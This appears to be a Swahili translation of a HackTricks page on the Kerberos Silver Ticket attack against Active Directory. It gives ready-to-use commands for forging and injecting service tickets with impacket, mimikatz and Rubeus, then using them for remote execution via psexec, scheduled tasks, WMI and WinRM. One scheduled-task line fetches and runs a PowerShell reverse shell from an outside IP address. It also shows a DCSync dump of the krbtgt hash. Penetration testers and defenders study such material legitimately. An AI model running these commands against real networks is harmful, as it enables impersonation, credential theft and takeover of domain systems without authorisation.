# Tiketi ya Fedha

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Sawa na Mawaidha ya Tuzo ya Kosa**: **jiandikishe** kwa **Intigriti**, jukwaa la **tuzo za kosa za premium lililoundwa na wadukuzi, kwa wadukuzi**! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata tuzo hadi **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Tiketi ya Fedha

Shambulio la **Tiketi ya Fedha** linahusisha kutumia tiketi za huduma katika mazingira ya Active Directory (AD). Mbinu hii inategemea **kupata hash ya NTLM ya akaunti ya huduma**, kama akaunti ya kompyuta, kufanya tiketi ya Huduma ya Kutoa Tiketi (TGS). Kwa tiketi iliyodanganywa hivi, mshambuliaji anaweza kupata huduma maalum kwenye mtandao, **kujifanya kuwa mtumiaji yeyote**, kwa kawaida lengo likiwa ni kupata mamlaka ya usimamizi. Inasisitizwa kwamba kutumia funguo za AES kwa kufanya tiketi ni salama zaidi na inayoweza kugundulika kidogo.

Kwa kutengeneza tiketi, zana tofauti hutumiwa kulingana na mfumo wa uendeshaji:

### Kwenye Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Kwenye Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
## Huduma Zilizopo

| Aina ya Huduma                             | Tiketi za Fedha za Huduma                                                |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Kulingana na OS pia:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Katika baadhi ya matukio unaweza tu kuomba: WINRM</p> |
| Kazi Zilizopangwa                          | HOST                                                                       |
| Kushiriki Faili za Windows, pia psexec     | CIFS                                                                       |
| Operesheni za LDAP, pamoja na DCSync       | LDAP                                                                       |
| Zana za Usimamizi wa Seva ya Mbali ya Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Tiketi za Dhahabu                          | krbtgt                                                                     |

Kutumia **Rubeus** unaweza **kuomba zote** tiketi hizi kwa kutumia parameter:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Matukio ya Tiketi za Fedha

* 4624: Ingia kwenye Akaunti
* 4634: Toka kwenye Akaunti
* 4672: Ingia kama Msimamizi

## Kutumia vibaya Tiketi za Huduma

Katika mifano ifuatayo fikiria kuwa tiketi imerudishwa ukiiga akaunti ya msimamizi.

### CIFS

Kwa tiketi hii utaweza kufikia folda za `C$` na `ADMIN$` kupitia **SMB** (ikiwa zimefunuliwa) na kunakili faili kwenye sehemu ya mfumo wa mbali kwa kufanya kitu kama:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
### MHUDUMA

Kwa idhini hii unaweza kuzalisha kazi zilizopangwa kwenye kompyuta za mbali na kutekeleza amri za kupindukia:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### MHUDUMA + RPCSS

Kwa tiketi hizi unaweza **kutekeleza WMI katika mfumo wa mwathiriwa**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Pata **maelezo zaidi kuhusu wmiexec** katika ukurasa ufuatao:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Ukiwa na ufikiaji wa winrm kwenye kompyuta unaweza **kuifikia** na hata kupata PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Angalia ukurasa ufuatao kujifunza **njia zaidi za kuunganisha na mwenyeji wa mbali kwa kutumia winrm**:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Tafadhali kumbuka kwamba **winrm lazima iwe hai na isikilize** kwenye kompyuta ya mbali ili kuifikia.
{% endhint %}

### LDAP

Kwa haki hii unaweza kudump database ya DC kwa kutumia **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Jifunze zaidi kuhusu DCSync** kwenye ukurasa ufuatao:

## Marejeo

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Siri ya tuzo ya mdudu**: **Jisajili** kwa **Intigriti**, jukwaa la tuzo la mdudu la malipo lililoundwa na wadukuzi, kwa wadukuzi! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata tuzo hadi **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
